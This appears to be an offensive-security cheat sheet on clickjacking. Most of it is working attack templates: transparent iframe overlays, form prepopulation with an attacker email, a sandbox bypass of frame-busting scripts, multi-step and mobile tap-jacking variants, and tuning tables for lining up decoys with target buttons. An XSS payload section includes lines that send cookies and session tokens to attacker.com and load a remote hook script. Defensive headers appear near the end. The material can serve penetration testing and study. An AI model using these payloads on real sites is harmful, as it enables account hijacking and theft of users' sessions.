# Clickjacking Cheat Sheet

## Quick test
```bash
curl -I https://target.com | grep -i "x-frame\|frame-ancestors"
echo '<iframe src="https://target.com"></iframe>' > test.html && open test.html
```
Vulnerable when page loads in iframe and no `X-Frame-Options` / `frame-ancestors`.

## Attack templates

### Standard overlay
```html
<style>
  iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
  div    { position:absolute; top:300px; left:60px; z-index:1; }
</style>
<div>Click me</div>
<iframe src="https://target.com/account"></iframe>
```

### Form prepopulation
```html
<style>
  iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
  div    { position:absolute; top:400px; left:80px; z-index:1; }
</style>
<div>Click me</div>
<iframe src="https://target.com/account?email=attacker@evil.com"></iframe>
```

### Frame-buster bypass (sandbox)
```html
<iframe sandbox="allow-forms" src="https://target.com/account?email=attacker@evil.com"></iframe>
```

### Multi-step
```html
<style>
  iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
  .step1 { position:absolute; top:330px; left:50px; z-index:1; }
  .step2 { position:absolute; top:285px; left:225px; z-index:1; }
</style>
<div class="step1">Click me first</div>
<div class="step2">Click me next</div>
<iframe src="https://target.com/account"></iframe>
```

### DOM-XSS-trigger overlay
```html
<iframe src="https://target.com/feedback?name=<img src=x onerror=alert(1)>"></iframe>
```

## CSS / sandbox reference

| Property | Value | Purpose |
|----------|-------|---------|
| `opacity` | `0.0001` | Invisible but interactive (NOT 0) |
| `z-index` | iframe `2`, decoy `1` | Iframe captures clicks |
| `position` | `relative` / `absolute` | Precise placement |
| `top`/`left` | px | Align over target button |
| `width`/`height` | px | Match target page |

Sandbox values:
- `sandbox="allow-forms"` — bypasses frame-buster scripts but lets forms submit
- `sandbox="allow-forms allow-scripts"` — frame buster runs (avoid)
- `sandbox=""` — blocks everything (incl. forms)

Alignment workflow: `opacity:0.1` to align → cursor changes over decoy → tweak top/left → set `opacity:0.0001` for delivery.

## Positioning by scenario

| Scenario | URL | Position (top, left) |
|----------|-----|----------------------|
| CSRF-protected action | `/account/delete` | 300px, 60px |
| Prefilled form | `?email=attacker@evil.com` | 400px, 80px |
| Frame-buster bypass | `+ sandbox="allow-forms"` | 400px, 80px |
| DOM XSS trigger | `?name=<img src=x onerror=...>` | 600px, 80px |
| Multistep confirm | step1 330px,50px; step2 285px,225px | — |

Common button positions (rough): account delete 280–320 / 50–80; email update 380–420 / 70–90; modal confirm 250–300 / 200–250; submit 580–620 / 70–90.

## Defense headers

```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';
Set-Cookie: session=...; SameSite=Strict; Secure; HttpOnly
```

Apache: `Header always set X-Frame-Options "DENY"; Header always set Content-Security-Policy "frame-ancestors 'none';"`.
Nginx: `add_header X-Frame-Options "DENY" always; add_header Content-Security-Policy "frame-ancestors 'none';" always;`.
Node/Express: `res.setHeader('X-Frame-Options','DENY'); res.setHeader('Content-Security-Policy',"frame-ancestors 'none';")`.
PHP: `header("X-Frame-Options: DENY"); header("Content-Security-Policy: frame-ancestors 'none';");`.

## Burp Clickbandit workflow

1. Burp menu → Burp Clickbandit
2. Copy script
3. Open target → DevTools console (F12) → paste
4. Click "Record mode" → perform actions → "Finish"
5. Review → "Save" exports HTML PoC

## Combined-attack XSS payloads (for iframe target)

```html
<img src=x onerror=alert(1)>
<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
<img src=x onerror=location='https://attacker.com?s='+localStorage.session>
<img src=x onerror=document.forms[0].submit()>
<script src=https://attacker.com:3000/hook.js></script>
```

## Variations

**Likejacking:**
```html
<iframe src="https://www.facebook.com/plugins/like.php?href=https://attacker.com/malware"></iframe>
```

**Drag-and-drop hijack:**
```html
<div id="dropzone">Drop files here</div>
<iframe src="https://attacker.com/receiver"></iframe>
<script>
document.getElementById('dropzone').addEventListener('drop', e => {
  e.preventDefault();
  // exfiltrate dropped files
});
</script>
```

**Mobile tap-jacking:**
```html
<style>
  iframe { position:fixed; top:0; left:0; width:100%; height:100%; opacity:0.0001; z-index:9999; }
  .decoy { position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); }
</style>
```

## Common mistakes

| Mistake | Fix |
|---------|-----|
| `opacity: 0` | iframe non-interactive — use `0.0001` |
| Low z-index on iframe | Set higher than decoy |
| Missing `position` | Use `relative` / `absolute` |
| `sandbox="allow-scripts"` | Frame buster fires — only `allow-forms` |
| Visible iframe in delivery | Reset `opacity:0.0001` after alignment |

## Troubleshooting

| Problem | Cause | Fix |
|---------|-------|-----|
| Iframe blank | `X-Frame-Options: DENY` | Can't bypass — attack fails |
| Iframe redirects | Frame-buster JS | Use `sandbox="allow-forms"` |
| Click ignored | Wrong z-index | Increase iframe z-index |
| Alignment off | Wrong top/left | Use opacity 0.1 to debug |
| Form not submitting | Empty sandbox | Add `allow-forms` |

## Quick header check

```bash
curl -sI https://target.com | grep -iE "x-frame-options|content-security-policy"
python3 -c "import requests; r=requests.get('https://target.com'); print('XFO:', r.headers.get('X-Frame-Options','MISSING')); print('CSP:', r.headers.get('Content-Security-Policy','MISSING'))"
```

## Resources

- OWASP Clickjacking: https://owasp.org/www-community/attacks/Clickjacking
- OWASP Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
- Burp Clickbandit: https://portswigger.net/burp/documentation/desktop/tools/clickbandit
- Quickstart: `clickjacking-quickstart.md`
